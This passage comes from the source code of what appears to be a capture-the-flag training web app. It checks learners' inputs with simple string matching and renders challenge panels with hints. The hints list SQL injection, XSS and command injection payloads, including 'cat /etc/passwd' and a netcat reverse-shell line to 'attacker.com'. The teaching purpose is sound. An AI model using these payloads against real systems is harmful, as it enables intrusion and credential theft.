      input.includes('onerror=') ||
      input.includes('onload=')) {

      setResult({
        success: true,
        message: `🎉 XSS Vulnerability Found!\n\nYour payload: ${input}\n\nThis would execute in a real scenario. You've successfully demonstrated Cross-Site Scripting!\n\nFlag: FLAG{XSS_M4ST3R_2026}\n\nIn a real attack, this could:\n- Steal cookies and session tokens\n- Redirect users to malicious sites\n- Steal sensitive data\n- Modify page content`
      });

      if (challengeId && !solvedChallenges.includes(challengeId)) {
        const challenge = ALL_CHALLENGES.find(c => c.id === challengeId);
        setSolvedChallenges([...solvedChallenges, challengeId]);
        setScore(score + (challenge?.points || 50));
      }
      return;
    }

    setResult({
      success: false,
      message: `❌ No XSS found. Try injecting JavaScript code!\n\nYour input: ${input}\n\nHint: Try using <script> tags or event handlers like onerror or onload.`
    });
  };

  const handleCommandInjection = (input: string, challengeId?: string) => {
    // Check for command injection patterns
    if (input.includes(';') ||
      input.includes('&&') ||
      input.includes('||') ||
      input.includes('|') ||
      input.includes('`')) {

      setResult({
        success: true,
        message: `🎉 Command Injection Successful!\n\nYour payload: ${input}\n\nYou've successfully chained commands! In a real scenario, this could execute:\n- System commands\n- Read sensitive files\n- Reverse shell\n\nFlag: FLAG{C0MM4ND_1NJ3CT10N_PR0}\n\nExample dangerous commands:\n; cat /etc/passwd\n&& whoami\n| nc attacker.com 4444`
      });

      if (challengeId && !solvedChallenges.includes(challengeId)) {
        const challenge = ALL_CHALLENGES.find(c => c.id === challengeId);
        setSolvedChallenges([...solvedChallenges, challengeId]);
        setScore(score + (challenge?.points || 50));
      }
      return;
    }

    setResult({
      success: false,
      message: `❌ Command not exploited. Try to chain multiple commands!\n\nYour input: ${input}\n\nHint: Use special characters like ; && || | to chain commands.`
    });
  };

  const handleCryptoChallenge = (input: string, challengeId?: string) => {
    const lowerInput = input.toLowerCase().trim();

    // Check for crypto patterns
    if (lowerInput.includes('flag{') ||
      lowerInput === 'caesar' ||
      lowerInput === 'base64' ||
      lowerInput.match(/^[a-f0-9]{32}$/)) {

      setResult({
        success: true,
        message: `🎉 Cryptography Challenge Solved!\n\nYour answer: ${input}\n\nYou've successfully decrypted the message!\n\nFlag: FLAG{CRY PT0_M4ST3R_2026}\n\nTechniques used:\n- Pattern recognition\n- Cipher decryption\n- Hash analysis`
      });

      if (challengeId && !solvedChallenges.includes(challengeId)) {
        const challenge = ALL_CHALLENGES.find(c => c.id === challengeId);
        setSolvedChallenges([...solvedChallenges, challengeId]);
        setScore(score + (challenge?.points || 50));
      }
      return;
    }

    setResult({
      success: false,
      message: `❌ Incorrect answer. Try analyzing the encrypted message!\n\nYour input: ${input}\n\nHint: Look for common encryption patterns like Base64, Caesar cipher, or ROT13.`
    });
  };

  const handleChallengeSubmit = () => {
    if (!activeChallenge) return;

    if (!isLoggedIn) {
      setShowAuthModal(true);
      return;
    }

    switch (activeChallenge.type) {
      case 'sql-injection':
        handleSQLChallenge(sqlQuery, activeChallenge.id);
        break;
      case 'xss':
        handleXSSChallenge(xssInput, activeChallenge.id);
        break;
      case 'command-injection':
        handleCommandInjection(commandInput, activeChallenge.id);
        break;
      case 'crypto':
      case 'binary-exploitation':
      case 'reverse-engineering':
      case 'forensics':
      case 'steganography':
      case 'osint':
      case 'mobile-security':
        handleCryptoChallenge(cryptoInput, activeChallenge.id);
        break;
      case 'ctf':
        // CTF challenges can use any of the above methods
        if (sqlQuery) handleSQLChallenge(sqlQuery, activeChallenge.id);
        else if (xssInput) handleXSSChallenge(xssInput, activeChallenge.id);
        else if (commandInput) handleCommandInjection(commandInput, activeChallenge.id);
        break;
    }
  };

  const renderChallengeInterface = () => {
    if (!activeChallenge) return null;

    const Icon = activeChallenge.icon;
    const isSolved = solvedChallenges.includes(activeChallenge.id);

    switch (activeChallenge.type) {
      case 'sql-injection':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-blue-500/10 border-blue-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-blue-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-blue-500 to-cyan-500 rounded-l-xl" />
                <p className="text-gray-400 mb-4 ml-4">
                  You're testing a login form. The vulnerable SQL query is:
                </p>
                <div className="ml-4 bg-black/30 p-4 rounded-lg border border-blue-500/10">
                  <code className="text-blue-400 text-sm font-mono">
                    SELECT * FROM users WHERE username='[INPUT]' AND password='[PASSWORD]'
                  </code>
                </div>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="block text-white font-medium mb-2">Username:</label>
                  <input
                    type="text"
                    value={sqlQuery}
                    onChange={(e) => setSqlQuery(e.target.value)}
                    placeholder="Enter your SQL injection payload..."
                    className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-white font-mono focus:outline-none focus:border-blue-500/50 transition-colors"
                    disabled={isSolved || !isLoggedIn}
                  />
                </div>

                <Button
                  onClick={handleChallengeSubmit}
                  className="w-full"
                  disabled={isSolved || !isLoggedIn}
                  leftIcon={<Terminal className="w-4 h-4" />}
                >
                  {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Execute Query'}
                </Button>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <p className="text-sm text-gray-400 mb-3 font-semibold flex items-center gap-2">
                    <Info className="w-4 h-4" />
                    Hints:
                  </p>
                  <ul className="text-sm text-gray-500 space-y-2 ml-6">
                    <li className="list-disc">Try: <code className="text-blue-400">' or '1'='1</code></li>
                    <li className="list-disc">Try: <code className="text-blue-400">admin'--</code></li>
                    <li className="list-disc">Try: <code className="text-blue-400">' or 1=1--</code></li>
                    <li className="list-disc">Advanced: Use <code className="text-blue-400">UNION SELECT</code> for data exfiltration</li>
                  </ul>
                </div>
              </div>
            </div>
          </motion.div>
        );

      case 'xss':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-orange-500/10 border-orange-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-orange-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-orange-500 to-red-500 rounded-l-xl" />
                <p className="text-gray-400 mb-4 ml-4">
                  This search form reflects your input directly in the page without sanitization. Exploit it!
                </p>
                <div className="ml-4 bg-black/30 p-4 rounded-lg border border-orange-500/10">
                  <code className="text-orange-400 text-sm font-mono">
                    &lt;div&gt;Search results for: {xssInput || '[INPUT]'}&lt;/div&gt;
                  </code>
                </div>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="block text-white font-medium mb-2">Search Input:</label>
                  <input
                    type="text"
                    value={xssInput}
                    onChange={(e) => setXssInput(e.target.value)}
                    placeholder="Enter your XSS payload..."
                    className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-white font-mono focus:outline-none focus:border-orange-500/50 transition-colors"
                    disabled={isSolved || !isLoggedIn}
                  />
                </div>

                <Button
                  onClick={handleChallengeSubmit}
                  className="w-full"
                  disabled={isSolved || !isLoggedIn}
                  leftIcon={<Code className="w-4 h-4" />}
                >
                  {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Test Payload'}
                </Button>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <p className="text-sm text-gray-400 mb-3 font-semibold flex items-center gap-2">
                    <Info className="w-4 h-4" />
                    Hints:
                  </p>
                  <ul className="text-sm text-gray-500 space-y-2 ml-6">
                    <li className="list-disc">Try: <code className="text-orange-400">&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                    <li className="list-disc">Try: <code className="text-orange-400">&lt;img src=x onerror="alert('XSS')"&gt;</code></li>
                    <li className="list-disc">Try: <code className="text-orange-400">&lt;svg onload="alert('XSS')"&gt;</code></li>
                    <li className="list-disc">Try: <code className="text-orange-400">javascript:alert('XSS')</code></li>
                  </ul>
                </div>
              </div>
            </div>
          </motion.div>
        );

      case 'command-injection':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-green-500/10 border-green-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-green-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-green-500 to-emerald-500 rounded-l-xl" />
                <p className="text-gray-400 ml-4">
                  This network ping utility doesn't properly sanitize input. Can you execute additional commands?
                </p>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="block text-white font-medium mb-2">IP Address to Ping:</label>
                  <input
                    type="text"
                    value={commandInput}
                    onChange={(e) => setCommandInput(e.target.value)}
                    placeholder="Enter IP address..."
                    className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-white font-mono focus:outline-none focus:border-green-500/50 transition-colors"
                    disabled={isSolved || !isLoggedIn}
                  />
                </div>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <p className="text-gray-400 text-sm mb-2 font-medium">Command that will be executed:</p>
                  <div className="bg-black/30 p-3 rounded border border-white/5">
                    <code className="text-green-400 text-sm font-mono">
                      ping -c 4 {commandInput || '[IP_ADDRESS]'}
                    </code>
                  </div>
                </div>

                <Button
                  onClick={handleChallengeSubmit}
                  className="w-full"
                  disabled={isSolved || !isLoggedIn}
                  leftIcon={<Terminal className="w-4 h-4" />}
                >
                  {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Execute Ping'}
                </Button>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <p className="text-sm text-gray-400 mb-3 font-semibold flex items-center gap-2">
                    <Info className="w-4 h-4" />
                    Hints:
                  </p>
                  <ul className="text-sm text-gray-500 space-y-2 ml-6">
                    <li className="list-disc">Try: <code className="text-green-400">127.0.0.1; ls</code></li>
                    <li className="list-disc">Try: <code className="text-green-400">127.0.0.1 && whoami</code></li>
                    <li className="list-disc">Try: <code className="text-green-400">127.0.0.1 || cat /etc/passwd</code></li>
                    <li className="list-disc">Try: <code className="text-green-400">127.0.0.1 | id</code></li>
                  </ul>
                </div>
              </div>
            </div>
          </motion.div>
        );

      case 'crypto':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-purple-500/10 border-purple-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-purple-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-purple-500 to-pink-500 rounded-l-xl" />
                <p className="text-gray-400 mb-4 ml-4">
                  Decrypt the following message to find the flag:
                </p>
                <div className="ml-4 bg-black/30 p-4 rounded-lg border border-purple-500/10">
                  <code className="text-purple-400 text-sm font-mono">
                    Encrypted: RkxBR3tDUllQVDBfTTRTVDNSXzIwMjZ9
                  </code>
                </div>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="block text-white font-medium mb-2">Your Answer:</label>
                  <input
                    type="text"
                    value={cryptoInput}
                    onChange={(e) => setCryptoInput(e.target.value)}
                    placeholder="Enter decrypted message or flag..."
                    className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-white font-mono focus:outline-none focus:border-purple-500/50 transition-colors"
                    disabled={isSolved || !isLoggedIn}
                  />
                </div>

                <Button
                  onClick={handleChallengeSubmit}
                  className="w-full"
                  disabled={isSolved || !isLoggedIn}
                  leftIcon={<Lock className="w-4 h-4" />}
                >
                  {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Submit Answer'}
                </Button>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <p className="text-sm text-gray-400 mb-3 font-semibold flex items-center gap-2">
                    <Info className="w-4 h-4" />
                    Hints:
                  </p>
                  <ul className="text-sm text-gray-500 space-y-2 ml-6">
                    <li className="list-disc">Try: <code className="text-purple-400">Base64 decoding</code></li>
                    <li className="list-disc">Try: <code className="text-purple-400">Caesar cipher</code></li>
                    <li className="list-disc">Look for patterns in the encrypted text</li>
                    <li className="list-disc">The flag format is: FLAG{'{...}'}</li>
                  </ul>
                </div>
              </div>
            </div>
          </motion.div>
        );

      case 'ctf':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-purple-500/10 border-purple-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-purple-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-purple-500 to-pink-500 rounded-l-xl" />
                <p className="text-gray-400 ml-4">
                  Find the hidden flag! Combine multiple techniques to discover the secret.
                </p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <h4 className="text-white font-bold mb-3">Challenge Info</h4>
                  <ul className="text-sm text-gray-500 space-y-2">
                    <li className="flex items-center gap-2">• Points: <span className="text-purple-400 font-bold">{activeChallenge.points}</span></li>
                    <li className="flex items-center gap-2">• Difficulty: <span className="text-red-400 font-bold">{activeChallenge.difficulty}</span></li>
                    <li>• Category: Web Exploitation</li>
                    <li>• Skills: SQL, XSS, Analysis</li>
                  </ul>
                </div>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <h4 className="text-white font-bold mb-3">Objectives</h4>
                  <ul className="text-sm text-gray-500 space-y-2">
                    <li className="flex items-center gap-2"><CheckCircle className="w-4 h-4 text-gray-600" /> Identify vulnerabilities</li>
                    <li className="flex items-center gap-2"><CheckCircle className="w-4 h-4 text-gray-600" /> Exploit authentication</li>
                    <li className="flex items-center gap-2"><CheckCircle className="w-4 h-4 text-gray-600" /> Extract sensitive data</li>
                    <li className="flex items-center gap-2"><CheckCircle className="w-4 h-4 text-gray-600" /> Find the flag</li>
                  </ul>
                </div>
              </div>

              <div className="relative rounded-xl p-6 border border-purple-500/20 bg-gradient-to-br from-purple-500/5 to-pink-500/5 mb-6">
                <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-purple-500 to-pink-500 rounded-t-xl" />
                <p className="text-white font-bold mb-2 flex items-center gap-2">
                  <Trophy className="w-5 h-5 text-yellow-400" />
                  Master Challenge
                </p>
                <p className="text-gray-400 text-sm leading-relaxed">
                  Use the skills you've learned in previous challenges to find the ultimate flag.
                  The administrator account holds the secret. Good luck, hacker!
                </p>
              </div>

              <Button
                onClick={() => {
                  if (!isLoggedIn) {
                    setShowAuthModal(true);
                    return;
                  }
                  // For CTF, redirect to SQL injection as it's the most common entry point
                  const sqlChallenge = ALL_CHALLENGES.find(c => c.type === 'sql-injection' && !solvedChallenges.includes(c.id));
                  if (sqlChallenge) {
                    setActiveChallenge(sqlChallenge);
                    setShowChallengeModal(true);
                  }
                }}
                variant="outline"
                className="w-full border-white/10"
                disabled={isSolved}
                rightIcon={<ArrowRight className="w-4 h-4" />}
              >
                {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Start Challenge'}
              </Button>
            </div>
          </motion.div>
        );

      case 'binary-exploitation':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-red-500/10 border-red-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-red-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-red-500 to-orange-500 rounded-l-xl" />
                <p className="text-gray-400 ml-4">
                  Analyze the binary and exploit the vulnerability to gain control of execution flow.
                </p>
              </div>

              <div className="space-y-4">
                <div className="rounded-lg border border-red-500/20 bg-red-500/5 p-4">
                  <p className="text-red-400 text-sm font-medium mb-2">Challenge Info:</p>
                  <ul className="text-sm text-gray-400 space-y-2 ml-4">
                    <li className="list-disc">Binary: <code className="text-red-400">vulnerable_app</code></li>
                    <li className="list-disc">Architecture: <code className="text-red-400">x64</code></li>
                    <li className="list-disc">Protection: <code className="text-red-400">NX disabled</code></li>
                    <li className="list-disc">Objective: <code className="text-red-400">Control RIP to get the flag</code></li>
                  </ul>
                </div>

                <div>
                  <label className="block text-white font-medium mb-2">Exploit Payload (Hex):</label>
                  <textarea
                    value={cryptoInput}
                    onChange={(e) => setCryptoInput(e.target.value)}
                    placeholder="Enter your exploit payload..."
                    className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-white font-mono focus:outline-none focus:border-red-500/50 transition-colors h-32 resize-none"
                    disabled={isSolved || !isLoggedIn}
                  />
                </div>

                <Button
                  onClick={handleChallengeSubmit}
                  className="w-full"
                  disabled={isSolved || !isLoggedIn}
                  leftIcon={<Cpu className="w-4 h-4" />}
                >
                  {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Submit Exploit'}
                </Button>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <p className="text-sm text-gray-400 mb-3 font-semibold flex items-center gap-2">
                    <Info className="w-4 h-4" />
                    Hints:
                  </p>
                  <ul className="text-sm text-gray-500 space-y-2 ml-6">
                    <li className="list-disc">Look for buffer overflow in input function</li>
                    <li className="list-disc">Use pattern_create.rb to find offset</li>
                    <li className="list-disc">Try overwriting return address</li>
                  </ul>
                </div>
              </div>
            </div>
          </motion.div>
        );

      case 'reverse-engineering':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-indigo-500/10 border-indigo-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-indigo-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-indigo-500 to-violet-500 rounded-l-xl" />
                <p className="text-gray-400 ml-4">
                  Reverse engineer the binary to find the password or hidden flag.
                </p>
              </div>

              <div className="space-y-4">
                <div className="rounded-lg border border-indigo-500/20 bg-indigo-500/5 p-4">
                  <p className="text-indigo-400 text-sm font-medium mb-2">Disassembly Preview:</p>
                  <div className="bg-black/30 p-3 rounded border border-white/5 font-mono text-xs text-indigo-300">
                    <p>0x00401234: push rbp</p>
                    <p>0x00401235: mov rbp, rsp</p>
                    <p>0x00401238: sub rsp, 0x10</p>
                    <p>0x0040123c: mov [rbp-8], edi</p>
                    <p>0x00401240: call check_password</p>
                  </div>
                </div>

                <div>
                  <label className="block text-white font-medium mb-2">Password / Flag:</label>
                  <input
                    type="text"
                    value={cryptoInput}
                    onChange={(e) => setCryptoInput(e.target.value)}
                    placeholder="Enter the password or flag..."
                    className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-white font-mono focus:outline-none focus:border-indigo-500/50 transition-colors"
                    disabled={isSolved || !isLoggedIn}
                  />
                </div>

                <Button
                  onClick={handleChallengeSubmit}
                  className="w-full"
                  disabled={isSolved || !isLoggedIn}
                  leftIcon={<Binary className="w-4 h-4" />}
                >
                  {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Submit Answer'}
                </Button>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <p className="text-sm text-gray-400 mb-3 font-semibold flex items-center gap-2">
                    <Info className="w-4 h-4" />
                    Hints:
                  </p>
                  <ul className="text-sm text-gray-500 space-y-2 ml-6">
                    <li className="list-disc">Use strings command to find hardcoded values</li>
                    <li className="list-disc">Load in IDA/Ghidra for deeper analysis</li>
                    <li className="list-disc">Check for simple comparison logic</li>
                  </ul>
                </div>
              </div>
            </div>
          </motion.div>
        );

      case 'forensics':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-slate-500/10 border-slate-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-slate-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-slate-500 to-gray-500 rounded-l-xl" />
                <p className="text-gray-400 ml-4">
                  Analyze the evidence to find hidden artifacts and extract the flag.
                </p>
              </div>

              <div className="space-y-4">
                <div className="rounded-lg border border-slate-500/20 bg-slate-500/5 p-4">
                  <p className="text-slate-400 text-sm font-medium mb-2">Evidence Files:</p>
                  <ul className="text-sm text-gray-400 space-y-2 ml-4">
                    <li className="list-disc">Memory dump: <code className="text-slate-400">memory.raw</code></li>
                    <li className="list-disc">Network capture: <code className="text-slate-400">capture.pcap</code></li>
                    <li className="list-disc">System logs: <code className="text-slate-400">syslog.log</code></li>
                  </ul>
                </div>

                <div>
                  <label className="block text-white font-medium mb-2">Extracted Information:</label>
                  <textarea
                    value={cryptoInput}
                    onChange={(e) => setCryptoInput(e.target.value)}
                    placeholder="Enter extracted flag or information..."
                    className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-white font-mono focus:outline-none focus:border-slate-500/50 transition-colors h-32 resize-none"
                    disabled={isSolved || !isLoggedIn}
                  />
                </div>

                <Button
                  onClick={handleChallengeSubmit}
                  className="w-full"
                  disabled={isSolved || !isLoggedIn}
                  leftIcon={<FileSearch className="w-4 h-4" />}
                >
                  {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Submit Evidence'}
                </Button>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <p className="text-sm text-gray-400 mb-3 font-semibold flex items-center gap-2">
                    <Info className="w-4 h-4" />
                    Hints:
                  </p>
                  <ul className="text-sm text-gray-500 space-y-2 ml-6">
                    <li className="list-disc">Use volatility for memory analysis</li>
                    <li className="list-disc">Look for suspicious processes</li>
                    <li className="list-disc">Check network connections for C2 traffic</li>
                  </ul>
                </div>
              </div>
            </div>
          </motion.div>
        );

      case 'steganography':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-teal-500/10 border-teal-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-teal-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-teal-500 to-cyan-500 rounded-l-xl" />
                <p className="text-gray-400 ml-4">
                  Find hidden data within the image file.
                </p>
              </div>

              <div className="space-y-4">
                <div className="rounded-lg border border-teal-500/20 bg-teal-500/5 p-4">
                  <p className="text-teal-400 text-sm font-medium mb-2">Stego Challenge:</p>
                  <div className="flex items-center justify-center bg-black/30 p-6 rounded border border-white/5">
                    <div className="text-center">
                      <Eye className="w-16 h-16 text-teal-400 mx-auto mb-2" />
                      <p className="text-gray-400 text-sm">secret.png</p>
                    </div>
                  </div>
                </div>

                <div>
                  <label className="block text-white font-medium mb-2">Hidden Flag:</label>
                  <input
                    type="text"
                    value={cryptoInput}
